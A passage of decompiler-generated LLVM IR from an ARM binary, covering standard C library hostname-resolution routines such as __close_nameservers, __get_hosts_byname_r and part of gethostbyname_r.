  %v3_16c2c = inttoptr i32 %v2_16c2c to i32*
  %v4_16c2c = load i32, i32* %v3_16c2c, align 4
  %v1_16c30 = add i32 %v4_16c2c, 1
  store i32 %v1_16c30, i32* %r3.global-to-local, align 4
  %v0_16c34 = load i32, i32* @r4, align 4
  %v2_16c34 = inttoptr i32 %v1_16c0c to i32*
  store i32 %v0_16c34, i32* %v2_16c34, align 4
  %v0_16c38 = load i32, i32* %r3.global-to-local, align 4
  %v1_16c38 = load i32, i32* @r5, align 4
  %v2_16c38 = load i32, i32* @r7, align 4
  %v3_16c38 = add i32 %v2_16c38, %v1_16c38
  %v4_16c38 = inttoptr i32 %v3_16c38 to i32*
  store i32 %v0_16c38, i32* %v4_16c38, align 4
  br label %dec_label_pc_16c3c

dec_label_pc_16c3c:                               ; preds = %dec_label_pc_16bbc, %dec_label_pc_16bac, %dec_label_pc_16898, %dec_label_pc_16bfc, %dec_label_pc_16bec, %dec_label_pc_16bd8, %dec_label_pc_16c20, %dec_label_pc_16c2c
  store i32 15444, i32* %r3.global-to-local, align 4
  %v0_16c40 = load i32, i32* @r5, align 4
  %v2_16c40 = add i32 %v0_16c40, 15444
  %v3_16c40 = inttoptr i32 %v2_16c40 to i32*
  %v4_16c40 = load i32, i32* %v3_16c40, align 4
  store i32 %v4_16c40, i32* %r0.global-to-local, align 4
  %v2_16c44 = icmp eq i32 %v4_16c40, 0
  br i1 %v2_16c44, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_16c3c
  store i32 93264, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_16c3c, %bb64
  %v2_16c4c = xor i1 %v2_16c44, true
  call void @__pseudo_cond_branch(i1 %v2_16c4c, i32 %v4_16c40)
  %v2_16c54 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16c54, i32* %r4.global-to-local, align 4
  store i32 %v12_16848, i32* @r7, align 4
  store i32 %v15_16848, i32* @r8, align 4
  store i32 %v18_16848, i32* @sb, align 4
  store i32 %v21_16848, i32* @sl, align 4
  store i32 %v27_16848, i32* %lr.global-to-local, align 4
  ret i32 %v4_16c40

; uselistorder directives
  uselistorder i32 %v1_16c0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16bbc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1694c, { 1, 0 }
  uselistorder i32 %v2_16934, { 1, 0 }
  uselistorder i32 %v2_16914, { 1, 0 }
  uselistorder i32 %v2_16b3c, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_16b0c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16afc, { 1, 0 }
  uselistorder i32 %v0_16a9c, { 1, 0, 2 }
  uselistorder i32 %v1_16a1417, { 1, 0 }
  uselistorder i32 %v1_16a0c10, { 1, 0 }
  uselistorder i32 %v0_16a0c9, { 1, 0 }
  uselistorder i32 %v1_16a14, { 1, 0 }
  uselistorder i32 %v2_16990, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 23, 1, 14, 15, 16, 0, 19, 17, 18, 20, 21, 22, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 18, 5, 0, 7, 6, 15, 8, 9, 10, 11, 12, 13, 14, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 15, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 55, 56, 13, 15, 14, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 27, 29, 28, 34, 33, 49, 48, 30, 31, 32, 36, 35, 38, 37, 39, 41, 40, 42, 44, 43, 45, 47, 46, 52, 50, 51, 54, 53 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 (i32)* @atol, { 0, 3, 2, 1 }
  uselistorder i32 58, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 (i32*)* @realloc, { 2, 3, 1, 0 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 11, 13, 14, 1, 15, 10, 2, 3, 9, 22, 19, 7, 8, 21, 24, 23, 12, 0, 20, 4, 5, 6, 16, 17, 18 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 1, 2, 5, 4, 3, 0 }
  uselistorder i32 -34020, { 1, 0 }
  uselistorder i32 1803, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 -33992, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -33992), { 1, 0 }
  uselistorder i32 15444, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_16c3c, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_16bac, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_16b60, { 1, 0 }
  uselistorder label %dec_label_pc_16b58, { 1, 0 }
  uselistorder label %dec_label_pc_16a1c, { 1, 0 }
  uselistorder label %dec_label_pc_16b3c.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_16898, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16ca4 = load i32, i32* @r4, align 4
  store i32 %v3_16ca4, i32* %stack_var_-20, align 4
  store i32 15452, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r5, align 4
  store i32 -33916, i32* %r3.global-to-local, align 4
  %v4_16cb8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15452) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -33916), i32* %r3.global-to-local, align 4
  store i32 93388, i32* @lr, align 4
  %v1_16cc8 = icmp ne i32 %v4_16cb8, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -33916)
  call void @__pseudo_cond_branch(i1 %v1_16cc8, i32 ptrtoint (i32* @global_var_f0a8.425 to i32))
  store i32 15456, i32* %r3.global-to-local, align 4
  store i32 15460, i32* @r7, align 4
  store i32 15448, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_16cdc = load i32, i32* @r5, align 4
  %v3_16cdc = add i32 %v1_16cdc, 15456
  %v4_16cdc = inttoptr i32 %v3_16cdc to i32*
  store i32 0, i32* %v4_16cdc, align 4
  %v0_16ce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16ce0 = load i32, i32* @r5, align 4
  %v2_16ce0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16ce0 = add i32 %v2_16ce0, %v1_16ce0
  %v4_16ce0 = inttoptr i32 %v3_16ce0 to i32*
  store i32 %v0_16ce0, i32* %v4_16ce0, align 4
  br label %dec_label_pc_16cf8

dec_label_pc_16ce8:                               ; preds = %dec_label_pc_16cf8
  store i32 %v4_16d0c, i32* %r3.global-to-local, align 4
  store i32 %v1_16d00, i32* %v3_16cf8, align 4
  %v0_16cf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16cf0 = load i32, i32* %r2.global-to-local, align 4
  %v4_16cf0 = mul i32 %v1_16cf0, 4
  %v5_16cf0 = add i32 %v4_16cf0, %v0_16cf0
  %v6_16cf0 = inttoptr i32 %v5_16cf0 to i32*
  %v7_16cf0 = load i32, i32* %v6_16cf0, align 4
  store i32 %v7_16cf0, i32* @r0, align 4
  %v0_16cf4 = call i32 @free()
  br label %dec_label_pc_16cf8

dec_label_pc_16cf8:                               ; preds = %entry, %dec_label_pc_16ce8
  %v0_16cf8 = load i32, i32* @r5, align 4
  %v1_16cf8 = load i32, i32* @r7, align 4
  %v2_16cf8 = add i32 %v1_16cf8, %v0_16cf8
  %v3_16cf8 = inttoptr i32 %v2_16cf8 to i32*
  %v4_16cf8 = load i32, i32* %v3_16cf8, align 4
  store i32 %v4_16cf8, i32* @r4, align 4
  %v2_16cfc = icmp eq i32 %v4_16cf8, 0
  %v1_16d00 = add i32 %v4_16cf8, -1
  store i32 %v1_16d00, i32* %r2.global-to-local, align 4
  %v0_16d04 = load i32, i32* @r6, align 4
  store i32 %v0_16d04, i32* %r3.global-to-local, align 4
  %v2_16d0c = add i32 %v0_16d04, %v0_16cf8
  %v3_16d0c = inttoptr i32 %v2_16d0c to i32*
  %v4_16d0c = load i32, i32* %v3_16d0c, align 4
  br i1 %v2_16cfc, label %dec_label_pc_16d0c, label %dec_label_pc_16ce8

dec_label_pc_16d0c:                               ; preds = %dec_label_pc_16cf8
  store i32 %v4_16d0c, i32* @r0, align 4
  %v0_16d10 = call i32 @free()
  %v0_16d14 = load i32, i32* @r4, align 4
  %v1_16d14 = load i32, i32* @r5, align 4
  %v2_16d14 = load i32, i32* @r6, align 4
  %v3_16d14 = add i32 %v2_16d14, %v1_16d14
  %v4_16d14 = inttoptr i32 %v3_16d14 to i32*
  store i32 %v0_16d14, i32* %v4_16d14, align 4
  %v2_16d1c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16d1c, i32* %r4.global-to-local, align 4
  ret i32 %v0_16d10

; uselistorder directives
  uselistorder i32 %v4_16d0c, { 1, 0 }
  uselistorder i32 %v1_16d00, { 1, 0 }
  uselistorder i32* %v3_16cf8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 15448, { 3, 1, 6, 4, 5, 0, 2 }
  uselistorder i32 15460, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 15456, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -33916, { 1, 2, 0, 3 }
  uselistorder i32 15452, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_16cf8, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1) local_unnamed_addr {
entry:
  %v0_16d3c = load i32, i32* @lr, align 4
  %v0_16d48 = load i32, i32* @r1, align 4
  store i32 %v0_16d48, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %v0_16d48, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_16d78 = call i32 @__read_etc_hosts_r()
  store i32 %v0_16d3c, i32* @lr, align 4
  ret i32 %v0_16d78
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp28, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_16d90 = load i32, i32* @r1, align 4
  store i32 %v0_16d90, i32* @r7, align 4
  store i32 %tmp28, i32* @r1, align 4
  store i32 0, i32* @r5, align 4
  %v0_16d9c = load i32, i32* @r0, align 4
  store i32 %v0_16d9c, i32* @fp, align 4
  %v2_16d9c = icmp eq i32 %v0_16d9c, 0
  %v2_16da0 = inttoptr i32 %tmp28 to i32*
  store i32 0, i32* %v2_16da0, align 4
  %v0_16da4 = load i32, i32* @r2, align 4
  %v0_16da8 = load i32, i32* @r3, align 4
  store i32 %v0_16da8, i32* @r6, align 4
  br i1 %v2_16d9c, label %bb, label %dec_label_pc_16db4

bb:                                               ; preds = %entry
  %v1_16dac = load i32, i32* @r5, align 4
  %v2_16dac = add i32 %v1_16dac, 22
  store i32 %v2_16dac, i32* @r5, align 4
  br label %dec_label_pc_170a4

dec_label_pc_16db4:                               ; preds = %entry
  store i32 53924, i32* %r3.global-to-local, align 4
  store i32 53920, i32* %r2.global-to-local, align 4
  %v0_16dbc = call i32 @__aeabi_read_tp()
  store i32 %v0_16dbc, i32* %r0.global-to-local, align 4
  %v3_16dc4 = load i16, i16* @global_var_24070.401, align 2
  %v4_16dc4 = sext i16 %v3_16dc4 to i32
  store i32 %v4_16dc4, i32* %r3.global-to-local, align 4
  store i32 %v4_16dc4, i32* %r2.global-to-local, align 4
  %v2_16dcc = add i32 %v4_16dc4, %v0_16dbc
  %v3_16dcc = inttoptr i32 %v2_16dcc to i32*
  %v4_16dcc = load i32, i32* %v3_16dcc, align 4
  store i32 %v4_16dcc, i32* @r8, align 4
  %v0_16dd0 = load i32, i32* @r5, align 4
  store i32 %v0_16dd0, i32* %v3_16dcc, align 4
  store i32 %v0_16dbc, i32* @r4, align 4
  store i32 2, i32* @r1, align 4
  %v0_16de4 = load i32, i32* @fp, align 4
  store i32 %v0_16de4, i32* %r0.global-to-local, align 4
  %v0_16de8 = load i32, i32* @r7, align 4
  store i32 %v0_16de8, i32* %r2.global-to-local, align 4
  store i32 %v0_16da4, i32* %r3.global-to-local, align 4
  %v1_16df8 = call i32 @__get_hosts_byname_r(i32 %v0_16de4)
  store i32 %v1_16df8, i32* %r0.global-to-local, align 4
  store i32 %v1_16df8, i32* @r5, align 4
  %v2_16dfc = icmp eq i32 %v1_16df8, 0
  br i1 %v2_16dfc, label %.thread4, label %dec_label_pc_16e10

.thread4:                                         ; preds = %dec_label_pc_16db4
  store i32 ptrtoint (i32* @global_var_d264.933 to i32), i32* %r3.global-to-local, align 4
  %v4_16e04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d264.933 to i32), i32 ptrtoint (i32* @global_var_16e0c.934 to i32)) to i32*), align 4
  store i32 %v4_16e04, i32* %r3.global-to-local, align 4
  %v1_16e08 = load i32, i32* @r8, align 4
  %v2_16e08 = load i32, i32* @r4, align 4
  %v4_16e08 = add i32 %v2_16e08, %v4_16e04
  %v5_16e08 = inttoptr i32 %v4_16e08 to i32*
  store i32 %v1_16e08, i32* %v5_16e08, align 4
  br label %dec_label_pc_170a4

dec_label_pc_16e10:                               ; preds = %dec_label_pc_16db4
  store i32 %tmp17, i32* @r1, align 4
  %v1_16e14 = inttoptr i32 %tmp17 to i32*
  %v2_16e14 = load i32, i32* %v1_16e14, align 4
  store i32 %v2_16e14, i32* %r3.global-to-local, align 4
  %v7_16e18 = icmp eq i32 %v2_16e14, 1
  br i1 %v7_16e18, label %dec_label_pc_16e34, label %dec_label_pc_16e20

dec_label_pc_16e20:                               ; preds = %dec_label_pc_16e10
  %v7_16e20 = icmp eq i32 %v2_16e14, 4
  br i1 %v7_16e20, label %dec_label_pc_16e5c, label %dec_label_pc_16e28

dec_label_pc_16e28:                               ; preds = %dec_label_pc_16e20
  %v3_16e28 = icmp eq i32 %v2_16e14, -1
  br i1 %v3_16e28, label %dec_label_pc_16e48, label %dec_label_pc_170a4

dec_label_pc_16e34:                               ; preds = %dec_label_pc_16e10
  %v7_16e34 = icmp eq i32 %v1_16df8, 2
  br i1 %v7_16e34, label %.thread6, label %bb33

bb33:                                             ; preds = %dec_label_pc_16e34
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16e64

.thread6:                                         ; preds = %dec_label_pc_16e34
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_16e64

dec_label_pc_16e48:                               ; preds = %dec_label_pc_16e28
  %v3_16e4c = load i16, i16* @global_var_24070.401, align 2
  %v4_16e4c = sext i16 %v3_16e4c to i32
  store i32 %v4_16e4c, i32* %r3.global-to-local, align 4
  %v0_16e50 = load i32, i32* @r4, align 4
  %v2_16e50 = add i32 %v0_16e50, %v4_16e4c
  %v3_16e50 = inttoptr i32 %v2_16e50 to i32*
  %v4_16e50 = load i32, i32* %v3_16e50, align 4
  store i32 %v4_16e50, i32* %r3.global-to-local, align 4
  %v7_16e54 = icmp eq i32 %v4_16e50, 2
  br i1 %v7_16e54, label %dec_label_pc_16e5c, label %dec_label_pc_170a4

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16e48, %dec_label_pc_16e20
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16e64

dec_label_pc_16e64:                               ; preds = %.thread6, %bb33, %dec_label_pc_16e5c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_16e5c ], [ 0, %bb33 ], [ 1, %.thread6 ]
  store i32 53756, i32* %r3.global-to-local, align 4
  %v0_16e68 = call i32 @__aeabi_read_tp()
  %v3_16e6c = load i16, i16* @global_var_24070.401, align 2
  %v4_16e6c = sext i16 %v3_16e6c to i32
  store i32 %tmp17, i32* @ip, align 4
  %v0_16e74 = load i32, i32* @r8, align 4
  %v3_16e74 = add i32 %v4_16e6c, %v0_16e68
  %v4_16e74 = inttoptr i32 %v3_16e74 to i32*
  store i32 %v0_16e74, i32* %v4_16e74, align 4
  store i32 -1, i32* @r3, align 4
  %v1_16e80 = load i32, i32* @ip, align 4
  %v2_16e80 = inttoptr i32 %v1_16e80 to i32*
  store i32 -1, i32* %v2_16e80, align 4
  %v0_16e84 = load i32, i32* @fp, align 4
  %v1_16e84 = inttoptr i32 %v0_16e84 to i8*
  store i32 %v0_16e84, i32* %r0.global-to-local, align 4
  %v3_16e88 = call i32 @strlen(i8* %v1_16e84)
  store i32 %v3_16e88, i32* %r0.global-to-local, align 4
  %v1_16e8c = add i32 %v3_16e88, 1
  store i32 %v1_16e8c, i32* @r4, align 4
  %v0_16e90 = load i32, i32* @r6, align 4
  %v7_16e94 = icmp sgt i32 %v0_16e90, %v1_16e8c
  br i1 %v7_16e94, label %dec_label_pc_16e98, label %dec_label_pc_170a0

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e64
  %v0_16e98 = load i32, i32* @fp, align 4
  store i32 %v0_16e98, i32* @r1, align 4
  store i32 %v1_16e8c, i32* @r2, align 4
  store i32 %v0_16da4, i32* @r0, align 4
  %v0_16ea4 = call i32 @memcpy()
  store i32 %v0_16ea4, i32* %r0.global-to-local, align 4
  %v1_16eac = load i32, i32* @r4, align 4
  %v2_16eac = add i32 %v1_16eac, %v0_16da4
  store i32 %v2_16eac, i32* @r1, align 4
  %v1_16eb0 = sub i32 0, %v2_16eac
  %v1_16eb4 = load i32, i32* @r6, align 4
  %v2_16eb4 = sub i32 %v1_16eb4, %v1_16eac
  store i32 %v2_16eb4, i32* %r2.global-to-local, align 4
  %v1_16eb8 = urem i32 %v1_16eb0, 4
  store i32 %v1_16eb8, i32* %r3.global-to-local, align 4
  %v2_16ebc = sub i32 %v2_16eb4, %v1_16eb8
  store i32 %v2_16ebc, i32* @sl, align 4
  %v1_16ec0 = add i32 %v2_16ebc, -8
  store i32 %v1_16ec0, i32* @r5, align 4
  %v7_16ec8 = icmp slt i32 %v1_16ec0, 256
  br i1 %v7_16ec8, label %dec_label_pc_170a0, label %dec_label_pc_16ecc

dec_label_pc_16ecc:                               ; preds = %dec_label_pc_16e98
  %v2_16ecc = add i32 %v1_16eb8, %v2_16eac
  store i32 %v2_16ecc, i32* @sb, align 4
  store i32 %v0_16da4, i32* @ip, align 4
  %v1_16ed4 = add i32 %v2_16ecc, 8
  store i32 %v1_16ed4, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_16edc = add i32 %v2_16ecc, 16
  store i32 %v1_16edc, i32* @r8, align 4
  %v4_16ee0 = inttoptr i32 %v2_16ecc to i32*
  store i32 %v0_16da4, i32* %v4_16ee0, align 4
  %v0_16ee4 = load i32, i32* @fp, align 4
  store i32 %v0_16ee4, i32* %r0.global-to-local, align 4
  %v0_16ee8 = load i32, i32* @r4, align 4
  %v1_16ee8 = load i32, i32* @sb, align 4
  %v2_16ee8 = add i32 %v1_16ee8, 4
  %v3_16ee8 = inttoptr i32 %v2_16ee8 to i32*
  store i32 %v0_16ee8, i32* %v3_16ee8, align 4
  %v0_16eec = load i32, i32* @r8, align 4
  %v2_16ef0 = inttoptr i32 %v0_16ee4 to i8*
  %v3_16ef0 = call i32 @inet_aton(i8* %v2_16ef0, i32 %v0_16eec)
  store i32 %v3_16ef0, i32* %r0.global-to-local, align 4
  %v1_16ef4 = load i32, i32* @r4, align 4
  %v9_16ef4 = icmp eq i32 %v3_16ef0, %v1_16ef4
  br i1 %v9_16ef4, label %dec_label_pc_16f38, label %dec_label_pc_16efc

dec_label_pc_16efc:                               ; preds = %dec_label_pc_16ecc
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_16f00 = load i32, i32* @r7, align 4
  %v2_16f00 = add i32 %v1_16f00, 8
  %v3_16f00 = inttoptr i32 %v2_16f00 to i32*
  store i32 2, i32* %v3_16f00, align 4
  %v0_16f04 = load i32, i32* %r3.global-to-local, align 4
  %v2_16f04 = mul i32 %v0_16f04, 2
  %v1_16f08 = load i32, i32* @r7, align 4
  %v2_16f08 = add i32 %v1_16f08, 12
  %v3_16f08 = inttoptr i32 %v2_16f08 to i32*
  store i32 %v2_16f04, i32* %v3_16f08, align 4
  %v3_16f0c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16f0c, i32* @r1, align 4
  store i32 %v0_16da4, i32* %r2.global-to-local, align 4
  store i32 %tmp17, i32* %r3.global-to-local, align 4
  %v0_16f18 = load i32, i32* @r4, align 4
  store i32 %v0_16f18, i32* @r5, align 4
  %v0_16f1c = load i32, i32* @r8, align 4
  %v1_16f1c = load i32, i32* @sb, align 4
  %v2_16f1c = add i32 %v1_16f1c, 8
  %v3_16f1c = inttoptr i32 %v2_16f1c to i32*
  store i32 %v0_16f1c, i32* %v3_16f1c, align 4
  %v0_16f20 = load i32, i32* @r7, align 4
  %v1_16f20 = load i32, i32* @r1, align 4
  %v2_16f20 = inttoptr i32 %v1_16f20 to i32*
  store i32 %v0_16f20, i32* %v2_16f20, align 4
  %v0_16f24 = load i32, i32* @r7, align 4
  %v1_16f24 = inttoptr i32 %v0_16f24 to i32*
  %v2_16f24 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_16f24, i32* %v1_16f24, align 4
  %v3_16f24 = add i32 %v0_16f24, 4
  %v4_16f24 = inttoptr i32 %v3_16f24 to i32*
  %v5_16f24 = load i32, i32* @sb, align 4
  store i32 %v5_16f24, i32* %v4_16f24, align 4
  %v0_16f28 = load i32, i32* @r6, align 4
  %v1_16f28 = load i32, i32* @r7, align 4
  %v2_16f28 = add i32 %v1_16f28, 16
  %v3_16f28 = inttoptr i32 %v2_16f28 to i32*
  store i32 %v0_16f28, i32* %v3_16f28, align 4
  %v0_16f2c = load i32, i32* @r4, align 4
  %v1_16f2c = load i32, i32* %r3.global-to-local, align 4
  %v2_16f2c = inttoptr i32 %v1_16f2c to i32*
  store i32 %v0_16f2c, i32* %v2_16f2c, align 4
  %v0_16f30 = load i32, i32* @r4, align 4
  %v1_16f30 = load i32, i32* @r6, align 4
  %v2_16f30 = add i32 %v1_16f30, 4
  %v3_16f30 = inttoptr i32 %v2_16f30 to i32*
  store i32 %v0_16f30, i32* %v3_16f30, align 4
  br label %dec_label_pc_170a4

dec_label_pc_16f38:                               ; preds = %dec_label_pc_16ecc
  store i32 %storemerge2, i32* @ip, align 4
  %v2_16f3c = icmp eq i32 %storemerge2, 0
  br i1 %v2_16f3c, label %dec_label_pc_16f44, label %dec_label_pc_16f74

dec_label_pc_16f44:                               ; preds = %dec_label_pc_16f38
  %v0_16f50 = load i32, i32* @fp, align 4
  store i32 %v0_16f50, i32* %r0.global-to-local, align 4
  %v2_16f58 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_16f58, i32* %r2.global-to-local, align 4
  %v2_16f5c = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_16f5c, i32* %r3.global-to-local, align 4
  %v7_16f68 = inttoptr i32 %v0_16f50 to i8*
  %v8_16f68 = call i32 @__dns_lookup(i8* %v7_16f68, i32 1, i32 %v2_16f58, i32 %v2_16f5c)
  store i32 %v8_16f68, i32* %r0.global-to-local, align 4
  %v1_16f6c = icmp slt i32 %v8_16f68, 0
  br i1 %v1_16f6c, label %dec_label_pc_16f74, label %dec_label_pc_16f88

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f44, %dec_label_pc_16f38
  store i32 %tmp17, i32* @r1, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_16e14, align 4
  br label %dec_label_pc_170a4

dec_label_pc_16f88:                               ; preds = %dec_label_pc_16f44
  store i32 %tmp10, i32* %r3.global-to-local, align 4
  %v7_16f8c = icmp eq i32 %tmp10, 1
  br i1 %v7_16f8c, label %dec_label_pc_16f94, label %dec_label_pc_1706c

dec_label_pc_16f94:                               ; preds = %dec_label_pc_16f88
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_16fac = load i32, i32* @r5, align 4
  %v2_16fac = add i32 %v0_16fac, -12
  store i32 %v2_16fac, i32* @r8, align 4
  %v8_16fac = icmp slt i32 %v2_16fac, 0
  br i1 %v8_16fac, label %bb35, label %dec_label_pc_16fb8

bb35:                                             ; preds = %dec_label_pc_16f94
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1708c

dec_label_pc_16fb8:                               ; preds = %dec_label_pc_16f94
  %v0_16fb8 = load i32, i32* @r6, align 4
  store i32 %v0_16fb8, i32* @r1, align 4
  %v2_16fbc = add i32 %v0_16fb8, 12
  store i32 %v2_16fbc, i32* @r0, align 4
  %v2_16fc0 = call i32 @memmove(i32 %v2_16fbc, i32 %v0_16fb8)
  %v0_16fc4 = load i32, i32* @sb, align 4
  %v1_16fc4 = add i32 %v0_16fc4, 4
  store i32 %v1_16fc4, i32* @r3, align 4
  %v1_16fc8 = load i32, i32* @r4, align 4
  %v2_16fc8 = add i32 %v1_16fc8, %v1_16fc4
  store i32 %v2_16fc8, i32* @r5, align 4
  store i32 %v2_16fc8, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_16fd8 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16fe4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16fe4

dec_label_pc_16fe4:                               ; preds = %dec_label_pc_16fb8, %dec_label_pc_16fe4
  %v0_16fe4 = phi i32 [ %v0_16fe4.pre, %dec_label_pc_16fb8 ], [ %v1_16fe8, %dec_label_pc_16fe4 ]
  %v1_16fe4 = load i32, i32* @r6, align 4
  %v7_16fe4 = inttoptr i32 %v1_16fe4 to i32*
  store i32 %v0_16fe4, i32* %v7_16fe4, align 4
  %v0_16fe8 = load i32, i32* @r5, align 4
  %v1_16fe8 = add i32 %v0_16fe8, 4
  store i32 %v1_16fe8, i32* @r5, align 4
  %v0_16fec = load i32, i32* %r0.global-to-local, align 4
  %v1_16fec = add i32 %v0_16fec, 1
  store i32 %v1_16fec, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_16ff4 = icmp eq i32 %v1_16fec, 0
  br i1 %v9_16ff4, label %dec_label_pc_16fe4, label %dec_label_pc_16ffc

dec_label_pc_16ffc:                               ; preds = %dec_label_pc_16fe4
  %v3_16ffc = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_16ffc, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_17004 = icmp eq i32 %v3_16ffc, 0
  %v1_17008 = load i32, i32* @r6, align 4
  %v5_17008 = mul i32 %v1_16fec, 4
  %v6_17008 = add i32 %v1_17008, %v5_17008
  %v7_17008 = inttoptr i32 %v6_17008 to i32*
  store i32 0, i32* %v7_17008, align 4
  br i1 %v2_17004, label %dec_label_pc_17038, label %dec_label_pc_17010

dec_label_pc_17010:                               ; preds = %dec_label_pc_16ffc
  %v0_17010 = load i32, i32* @r4, align 4
  %v1_17010 = inttoptr i32 %v0_17010 to i8*
  store i32 %v0_17010, i32* %r0.global-to-local, align 4
  %v3_17014 = call i32 @strlen(i8* %v1_17010)
  store i32 %v3_17014, i32* %r0.global-to-local, align 4
  %v0_17018 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_17018, %v3_17014
  br i1 %tmp, label %dec_label_pc_17020, label %dec_label_pc_17038

dec_label_pc_17020:                               ; preds = %dec_label_pc_17010
  %v0_17020 = load i32, i32* @r4, align 4
  store i32 %v0_17020, i32* @r1, align 4
  %v0_17024 = load i32, i32* @r5, align 4
  store i32 %v0_17024, i32* %r0.global-to-local, align 4
  %v2_17028 = inttoptr i32 %v0_17024 to i8*
  %v3_17028 = call i32 @strcpy(i8* %v2_17028, i32 %v0_17020)
  store i32 %v3_17028, i32* %r0.global-to-local, align 4
  %v0_1702c = load i32, i32* @r5, align 4
  br label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %dec_label_pc_17010, %dec_label_pc_16ffc, %dec_label_pc_17020
